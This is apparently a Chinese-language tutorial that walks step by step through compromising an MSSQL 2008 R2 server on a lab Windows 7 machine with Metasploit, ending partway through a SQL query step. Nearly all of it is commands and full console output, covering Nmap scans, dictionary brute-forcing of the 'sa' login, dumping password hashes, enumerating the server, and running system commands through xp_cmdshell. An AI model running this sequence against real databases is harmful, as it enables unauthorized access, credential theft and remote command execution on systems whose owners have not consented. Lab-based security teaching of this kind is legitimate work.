# Metasploit渗透MSSQL

攻击机 kali 192.168.109.137

靶机 Win7_x64 192.168.109.139

数据库 MSSQL 2008 R2

MSSQL运行在TCP的1433端口以及UDP的1434端口

## 使用NMAP对MSSQL进行踩点

这里，我们使用Metasploit自带的db_nmap插件

**首先我们对目标的1433端口进行扫描**

```
db_nmap -sV -p 1433 192.168.109.139
```

具体操作情况如下：

```
msf > db_nmap -sV -p 1433 192.168.109.139
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 09:56 CST
[*] Nmap: Nmap scan report for 192.168.109.139
[*] Nmap: Host is up (0.00035s latency).
[*] Nmap: PORT     STATE SERVICE  VERSION
[*] Nmap: 1433/tcp open  ms-sql-s Microsoft SQL Server 2008 R2 10.50.4000; SP2
[*] Nmap: MAC Address: 00:0C:29:4A:EB:E0 (VMware)
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```

可以看到输出了MSSQL的一些信息。

**扫描1434端口**

```
db_nmap -sU -sV -p 1434 192.168.109.139
```

具体操作情况如下：

```
msf > db_nmap -sU -sV -p 1434 192.168.109.139
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 09:57 CST
[*] Nmap: Nmap scan report for 192.168.109.139
[*] Nmap: Host is up (0.00032s latency).
[*] Nmap: PORT     STATE SERVICE  VERSION
[*] Nmap: 1434/udp open  ms-sql-m Microsoft SQL Server 10.50.4000.0 (ServerName: LIUYAZHUANG-PC; TCPPort: 1433)
[*] Nmap: MAC Address: 00:0C:29:4A:EB:E0 (VMware)
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

**使用内置的NMap脚本获得一些关于目标数据库的附加信息**

```
db_nmap -sU --script=ms-sql-info -p 1434 192.168.109.139
```

具体操作情况如下：

```
msf > db_nmap -sU --script=ms-sql-info -p 1434 192.168.109.139
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 09:59 CST
[*] Nmap: Nmap scan report for 192.168.109.139
[*] Nmap: Host is up (0.00044s latency).
[*] Nmap: PORT     STATE         SERVICE
[*] Nmap: 1434/udp open|filtered ms-sql-m
[*] Nmap: MAC Address: 00:0C:29:4A:EB:E0 (VMware)
[*] Nmap: Host script results:
[*] Nmap: | ms-sql-info:
[*] Nmap: |   Windows server name: LIUYAZHUANG-PC
[*] Nmap: |   192.168.109.139\MSSQLSERVER:
[*] Nmap: |     Instance name: MSSQLSERVER
[*] Nmap: |     Version:
[*] Nmap: |       name: Microsoft SQL Server 2008 R2 SP2
[*] Nmap: |       number: 10.50.4000.00
[*] Nmap: |       Product: Microsoft SQL Server 2008 R2
[*] Nmap: |       Service pack level: SP2
[*] Nmap: |       Post-SP patches applied: false
[*] Nmap: |     TCP port: 1433
[*] Nmap: |     Named pipe: \\192.168.109.139\pipe\sql\query
[*] Nmap: |_    Clustered: false
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
```

## 使用Metasploit的模块进行扫描

这里，我们用到可Metasploit的mssql_ping

```
use auxiliary/scanner/mssql/mssql_ping
show options
set RHOSTS 192.168.109.139
run
```

具体操作情况如下：

```
msf > use auxiliary/scanner/mssql/mssql_ping
msf auxiliary(scanner/mssql/mssql_ping) > show options

Module options (auxiliary/scanner/mssql/mssql_ping):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target address range or CIDR identifier
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(scanner/mssql/mssql_ping) > set RHOSTS 192.168.109.139
RHOSTS => 192.168.109.139
msf auxiliary(scanner/mssql/mssql_ping) > 
msf auxiliary(scanner/mssql/mssql_ping) > 
msf auxiliary(scanner/mssql/mssql_ping) > run

[*] 192.168.109.139:      - SQL Server information for 192.168.109.139:
[+] 192.168.109.139:      -    ServerName      = LIUYAZHUANG-PC
[+] 192.168.109.139:      -    InstanceName    = MSSQLSERVER
[+] 192.168.109.139:      -    IsClustered     = No
[+] 192.168.109.139:      -    Version         = 10.50.4000.0
[+] 192.168.109.139:      -    tcp             = 1433
[+] 192.168.109.139:      -    np              = \\LIUYAZHUANG-PC\pipe\sql\query
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mssql/mssql_ping) >
```

## 爆破MSSQL密码

这里，用到的是Metasploit的mssql_login模块。

MSSQL的默认用户名为sa，默认密码为空，所以我们先测试下用户名为sa，密码为空的情况：

```
use auxiliary/scanner/mssql/mssql_login
show options
set RHOSTS 192.168.109.139
run
```

具体操作情况如下：

```
msf auxiliary(scanner/mssql/mssql_ping) > use auxiliary/scanner/mssql/mssql_login
msf auxiliary(scanner/mssql/mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   BLANK_PASSWORDS      false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   RHOSTS                                yes       The target address range or CIDR identifier
   RPORT                1433             yes       The target port (TCP)
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME                              no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
   VERBOSE              true             yes       Whether to print output for all attempts

msf auxiliary(scanner/mssql/mssql_login) > set RHOSTS 192.168.109.139
RHOSTS => 192.168.109.139
msf auxiliary(scanner/mssql/mssql_login) > run

[*] 192.168.109.139:1433  - 192.168.109.139:1433 - MSSQL - Starting authentication scanner.
[*] Error: 192.168.109.139: Metasploit::Framework::LoginScanner::Invalid Cred details can't be blank, Cred details can't be blank (Metasploit::Framework::LoginScanner::MSSQL)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mssql/mssql_login) > 
```

可以看到登录失败，所以目标数据库的账户和密码不是默认的。

这里，我们继续构造目标数据库的用户名字典和密码字典，分别为：/root/user.txt 和 /root/pass.txt

接下来，我们使用用户名字典和密码字典爆破目标数据库

```
use auxiliary/scanner/mssql/mssql_login
show options
set RHOSTS 192.168.109.139
set USER_FILE /root/user.txt
set PASS_FILE /root/pass.txt
run
```

具体操作情况如下：

```
msf > use auxiliary/scanner/mssql/mssql_login
msf auxiliary(scanner/mssql/mssql_login) > show options

Module options (auxiliary/scanner/mssql/mssql_login):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   BLANK_PASSWORDS      false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
   DB_ALL_USERS         false            no        Add all users in the current database to the list
   PASSWORD                              no        A specific password to authenticate with
   PASS_FILE                             no        File containing passwords, one per line
   RHOSTS               192.168.109.139  yes       The target address range or CIDR identifier
   RPORT                1433             yes       The target port (TCP)
   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME                              no        A specific username to authenticate as
   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS         false            no        Try the username as the password for all users
   USER_FILE                             no        File containing usernames, one per line
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
   VERBOSE              true             yes       Whether to print output for all attempts

msf auxiliary(scanner/mssql/mssql_login) > set USER_FILE /root/user.txt
USER_FILE => /root/user.txt
msf auxiliary(scanner/mssql/mssql_login) > set PASS_FILE /root/pass.txt
PASS_FILE => /root/pass.txt
msf auxiliary(scanner/mssql/mssql_login) > run

[*] 192.168.109.139:1433  - 192.168.109.139:1433 - MSSQL - Starting authentication scanner.
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:liuyazhuang (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:liu (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:123456 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:3874378 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:Cdmn@339 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:@@@@@ (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:1111 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:236726 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:23473748 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\xiaoming:223u4343 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:liuyazhuang (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:liu (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:123456 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:3874378 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:Cdmn@339 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:@@@@@ (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:1111 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:236726 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:23473748 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\liuyazhuang:223u4343 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:liuyazhuang (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:liu (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:123456 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:3874378 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:Cdmn@339 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:@@@@@ (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:1111 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:236726 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:23473748 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\jack:223u4343 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:liuyazhuang (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:liu (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:123456 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:3874378 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:Cdmn@339 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:@@@@@ (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:1111 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:236726 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:23473748 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\lyz:223u4343 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:liuyazhuang (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:liu (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:123456 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:3874378 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:Cdmn@339 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:@@@@@ (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:1111 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:236726 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:23473748 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\administrator:223u4343 (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\sa:liuyazhuang (Incorrect: )
[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\sa:liu (Incorrect: )
[+] 192.168.109.139:1433  - 192.168.109.139:1433 - Login Successful: WORKSTATION\sa:123456
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mssql/mssql_login) > 
```

可以看到目标数据库的用户名为sa，密码为123456

## 查找/捕获服务器的口令

这里，用到的是Metasploit的mssql_hashdump模块。

```
use auxiliary/scanner/mssql/mssql_hashdump
show options
set RHOSTS 192.168.109.139
set PASSWORD 123456
run
```

具体操作情况如下：

```
msf auxiliary(scanner/mssql/mssql_login) > use auxiliary/scanner/mssql/mssql_hashdump 
msf auxiliary(scanner/mssql/mssql_hashdump) > show options

Module options (auxiliary/scanner/mssql/mssql_hashdump):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target address range or CIDR identifier
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(scanner/mssql/mssql_hashdump) > set RHOSTS 192.168.109.139
RHOSTS => 192.168.109.139
msf auxiliary(scanner/mssql/mssql_hashdump) > set PASSWORD 123456
PASSWORD => 123456
msf auxiliary(scanner/mssql/mssql_hashdump) > run

[*] 192.168.109.139:1433  - Instance Name: nil
[+] 192.168.109.139:1433  - Saving mssql05 = sa:0100803a5accdbbe36fd02ade28e2e4ed463f311238ab3410a92
[+] 192.168.109.139:1433  - Saving mssql05 = ##MS_PolicyTsqlExecutionLogin##:0100ab666dffdfa0f0ce5d9dc217abc8b87bface1efda74dba9c
[+] 192.168.109.139:1433  - Saving mssql05 = ##MS_PolicyEventProcessingLogin##:0100ad950534143cd9e69553cd7715b5d0b68c54032124ee8992
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/mssql/mssql_hashdump) > 
```

接下来，我们就可以使用其他工具爆破这些密码了。

## 浏览MSSQL

这里用到的是Metasploit的mssql_enum模块。

```
use auxiliary/admin/mssql/mssql_enum
show options
set RHOST 192.168.109.139
set PASSWORD 123456
run
```

具体操作情况如下：

```
msf > use auxiliary/admin/mssql/mssql_enum
msf auxiliary(admin/mssql/mssql_enum) > show options

Module options (auxiliary/admin/mssql/mssql_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOST                                 yes       The target address
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_enum) > set RHOST 192.168.109.139
RHOST => 192.168.109.139
msf auxiliary(admin/mssql/mssql_enum) > set PASSWORD 123456
PASSWORD => 123456
msf auxiliary(admin/mssql/mssql_enum) > run

[*] 192.168.109.139:1433 - Running MS SQL Server Enumeration...
[*] 192.168.109.139:1433 - Version:
[*] Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (X64) 
[*]     Jun 28 2012 08:36:30 
[*]     Copyright (c) Microsoft Corporation
[*]     Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1) (Hypervisor)
[*] 192.168.109.139:1433 - Configuration Parameters:
[*] 192.168.109.139:1433 -  C2 Audit Mode is Not Enabled
[*] 192.168.109.139:1433 -  xp_cmdshell is Enabled
[*] 192.168.109.139:1433 -  remote access is Enabled
[*] 192.168.109.139:1433 -  allow updates is Not Enabled
[*] 192.168.109.139:1433 -  Database Mail XPs is Not Enabled
[*] 192.168.109.139:1433 -  Ole Automation Procedures are Not Enabled
[*] 192.168.109.139:1433 - Databases on the server:
[*] 192.168.109.139:1433 -  Database name:master
[*] 192.168.109.139:1433 -  Database Files for master:
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\master.mdf
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
[*] 192.168.109.139:1433 -  Database name:tempdb
[*] 192.168.109.139:1433 -  Database Files for tempdb:
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\tempdb.mdf
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\templog.ldf
[*] 192.168.109.139:1433 -  Database name:model
[*] 192.168.109.139:1433 -  Database Files for model:
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\model.mdf
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\modellog.ldf
[*] 192.168.109.139:1433 -  Database name:msdb
[*] 192.168.109.139:1433 -  Database Files for msdb:
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
[*] 192.168.109.139:1433 -      d:\Program Files\Microsoft SQL Server\MSSQL10_50.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
[*] 192.168.109.139:1433 - System Logins on this Server:
[*] 192.168.109.139:1433 -  sa
[*] 192.168.109.139:1433 -  ##MS_SQLResourceSigningCertificate##
[*] 192.168.109.139:1433 -  ##MS_SQLReplicationSigningCertificate##
[*] 192.168.109.139:1433 -  ##MS_SQLAuthenticatorCertificate##
[*] 192.168.109.139:1433 -  ##MS_PolicySigningCertificate##
[*] 192.168.109.139:1433 -  ##MS_SmoExtendedSigningCertificate##
[*] 192.168.109.139:1433 -  ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.109.139:1433 -  NT AUTHORITY\SYSTEM
[*] 192.168.109.139:1433 -  NT SERVICE\MSSQLSERVER
[*] 192.168.109.139:1433 -  liuyazhuang-PC\liuyazhuang
[*] 192.168.109.139:1433 -  BUILTIN\Users
[*] 192.168.109.139:1433 -  ##MS_PolicyEventProcessingLogin##
[*] 192.168.109.139:1433 -  ##MS_AgentSigningCertificate##
[*] 192.168.109.139:1433 - Disabled Accounts:
[*] 192.168.109.139:1433 -  ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.109.139:1433 -  ##MS_PolicyEventProcessingLogin##
[*] 192.168.109.139:1433 - No Accounts Policy is set for:
[*] 192.168.109.139:1433 -  All System Accounts have the Windows Account Policy Applied to them.
[*] 192.168.109.139:1433 - Password Expiration is not checked for:
[*] 192.168.109.139:1433 -  sa
[*] 192.168.109.139:1433 -  ##MS_PolicyTsqlExecutionLogin##
[*] 192.168.109.139:1433 -  ##MS_PolicyEventProcessingLogin##
[*] 192.168.109.139:1433 - System Admin Logins on this Server:
[*] 192.168.109.139:1433 -  sa
[*] 192.168.109.139:1433 -  NT AUTHORITY\SYSTEM
[*] 192.168.109.139:1433 -  NT SERVICE\MSSQLSERVER
[*] 192.168.109.139:1433 -  liuyazhuang-PC\liuyazhuang
[*] 192.168.109.139:1433 - Windows Logins on this Server:
[*] 192.168.109.139:1433 -  NT AUTHORITY\SYSTEM
[*] 192.168.109.139:1433 -  liuyazhuang-PC\liuyazhuang
[*] 192.168.109.139:1433 - Windows Groups that can logins on this Server:
[*] 192.168.109.139:1433 -  NT SERVICE\MSSQLSERVER
[*] 192.168.109.139:1433 -  BUILTIN\Users
[*] 192.168.109.139:1433 - Accounts with Username and Password being the same:
[*] 192.168.109.139:1433 -  No Account with its password being the same as its username was found.
[*] 192.168.109.139:1433 - Accounts with empty password:
[*] 192.168.109.139:1433 -  No Accounts with empty passwords where found.
[*] 192.168.109.139:1433 - Stored Procedures with Public Execute Permission found:
[*] 192.168.109.139:1433 -  sp_replsetsyncstatus
[*] 192.168.109.139:1433 -  sp_replcounters
[*] 192.168.109.139:1433 -  sp_replsendtoqueue
[*] 192.168.109.139:1433 -  sp_resyncexecutesql
[*] 192.168.109.139:1433 -  sp_prepexecrpc
[*] 192.168.109.139:1433 -  sp_repltrans
[*] 192.168.109.139:1433 -  sp_xml_preparedocument
[*] 192.168.109.139:1433 -  xp_qv
[*] 192.168.109.139:1433 -  xp_getnetname
[*] 192.168.109.139:1433 -  sp_releaseschemalock
[*] 192.168.109.139:1433 -  sp_refreshview
[*] 192.168.109.139:1433 -  sp_replcmds
[*] 192.168.109.139:1433 -  sp_unprepare
[*] 192.168.109.139:1433 -  sp_resyncprepare
[*] 192.168.109.139:1433 -  sp_createorphan
[*] 192.168.109.139:1433 -  xp_dirtree
[*] 192.168.109.139:1433 -  sp_replwritetovarbin
[*] 192.168.109.139:1433 -  sp_replsetoriginator
[*] 192.168.109.139:1433 -  sp_xml_removedocument
[*] 192.168.109.139:1433 -  sp_repldone
[*] 192.168.109.139:1433 -  sp_reset_connection
[*] 192.168.109.139:1433 -  xp_fileexist
[*] 192.168.109.139:1433 -  xp_fixeddrives
[*] 192.168.109.139:1433 -  sp_getschemalock
[*] 192.168.109.139:1433 -  sp_prepexec
[*] 192.168.109.139:1433 -  xp_revokelogin
[*] 192.168.109.139:1433 -  sp_resyncuniquetable
[*] 192.168.109.139:1433 -  sp_replflush
[*] 192.168.109.139:1433 -  sp_resyncexecute
[*] 192.168.109.139:1433 -  xp_grantlogin
[*] 192.168.109.139:1433 -  sp_droporphans
[*] 192.168.109.139:1433 -  xp_regread
[*] 192.168.109.139:1433 -  sp_getbindtoken
[*] 192.168.109.139:1433 -  sp_replincrementlsn
[*] 192.168.109.139:1433 - Instances found on this server:
[*] 192.168.109.139:1433 -  MSSQLSERVER
[*] 192.168.109.139:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 192.168.109.139:1433 -  NT AUTHORITY\NETWORKSERVICE
[*] Auxiliary module execution completed
```

## 重新载入xp_cmd功能

这里用到的是Metasploit的mssql_exec, 通过重新载入禁用的xp_cmdshell功能来运行系统级的命令

```
use auxiliary/admin/mssql/mssql_exec
show options
set CMD 'ipconfig'
set RHOST 192.168.109.139
set PASSWORD 123456
run
```

具体操作情况如下：

```
msf > use auxiliary/admin/mssql/mssql_exec 
msf auxiliary(admin/mssql/mssql_exec) > show options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOST                                                      yes       The target address
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_exec) > set CMD 'ipconfig'
CMD => ipconfig
msf auxiliary(admin/mssql/mssql_exec) > set RHOST 192.168.109.139
RHOST => 192.168.109.139
msf auxiliary(admin/mssql/mssql_exec) > set PASSWORD 123456
PASSWORD => 123456
msf auxiliary(admin/mssql/mssql_exec) > run

[*] 192.168.109.139:1433 - SQL Query: EXEC master..xp_cmdshell 'ipconfig'



 output
 ------
 
 Windows IP M�n
 
 
 *g�w�M�hV VPN - VPN Client:
 
    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_
    ޏ�cyr�[�v DNS T . . . . . . . : 
 
 �N*YQ�M�hV Bluetooth Q�~ޏ�c:
 
    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_
    ޏ�cyr�[�v DNS T . . . . . . . : 
 
 �N*YQ�M�hV ,g0Wޏ�c:
 
    ޏ�cyr�[�v DNS T . . . . . . . : localdomain
    ,g0W���c IPv6 0W@W. . . . . . . . : fe80::ccb2:bf07:23ba:9925%11
    IPv4 0W@W . . . . . . . . . . . . : 192.168.109.139
    P[Q�cx  . . . . . . . . . . . . : 255.255.255.0
    ؞��QsQ. . . . . . . . . . . . . : 192.168.109.2
 
 ��S��M�hV isatap.{5761F2CD-B72F-4D63-9594-8FFF71AE3A2D}:
 
    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_
    ޏ�cyr�[�v DNS T . . . . . . . : 
 
 ��S��M�hV ,g0Wޏ�c* 6:
 
    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_
    ޏ�cyr�[�v DNS T . . . . . . . : 
 
 ��S��M�hV isatap.localdomain:
 
    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_
    ޏ�cyr�[�v DNS T . . . . . . . : localdomain
 
 ��S��M�hV isatap.{BE1D7C8C-9941-432D-97A0-B5A8B6A37A0B}:
 
    �ZSO�r`  . . . . . . . . . . . . : �ZSO�]�e_
    ޏ�cyr�[�v DNS T . . . . . . . : 
 

[*] Auxiliary module execution completed
msf auxiliary(admin/mssql/mssql_exec) > 
```

## 运行SQL查询命令

```
use auxiliary/admin/mssql/mssql_sql
show options
set RHOST 192.168.109.139
set PASSWORD 123456
run
```

具体操作情况如下：

```
msf > use auxiliary/admin/mssql/mssql_sql
msf auxiliary(admin/mssql/mssql_sql) > show options

Module options (auxiliary/admin/mssql/mssql_sql):

   Name                 Current Setting   Required  Description
   ----                 ---------------   --------  -----------
   PASSWORD                               no        The password for the specified username
   RHOST                                  yes       The target address
   RPORT                1433              yes       The target port (TCP)
   SQL                  select @@version  no        The SQL query to execute
   TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa                no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false             yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_sql) > set RHOST 192.168.109.139
RHOST => 192.168.109.139
msf auxiliary(admin/mssql/mssql_sql) > set PASSWORD 123456
PASSWORD => 123456
